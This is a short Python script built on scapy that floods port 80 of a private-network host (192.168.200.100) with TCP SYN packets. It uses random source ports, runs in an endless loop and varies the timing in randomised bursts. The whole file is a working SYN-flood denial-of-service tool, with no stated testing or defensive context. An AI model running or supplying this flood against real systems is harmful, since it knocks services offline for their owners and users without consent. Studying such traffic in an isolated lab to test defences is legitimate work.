#!/usr/bin/python3

from scapy.all import *
import time
import random

# Set the target IP and port
target_ip = "192.168.200.100"
target_port = 80

# Create an IP packet with the target IP as the destination
ip = IP(dst=target_ip)

# Define a list of random ranges
random_ranges = [(0, 0.1),(0, 0.01)]

while True:
    # Get current time in seconds since epoch 
    start_time = time.time()
    # Generate a random duration in seconds to run loop 
    duration_seconds = random.randint(2,10) 
    # Randomly select range from list 
    rand_range=random.choice(random_ranges)
    while True:
        # Check if duration has passed 
        if (time.time() - start_time) > duration_seconds:
            break
    
        # Create TCP SYN packet with target port as destination port 
        SYN=TCP(sport=RandShort(), dport=target_port, flags="S", seq=42)
    
        # Send SYN packet without waiting for response 
        send(ip/SYN)
    
        # Wait for rand amount before sending next packet 
        time.sleep(random.uniform(*rand_range))
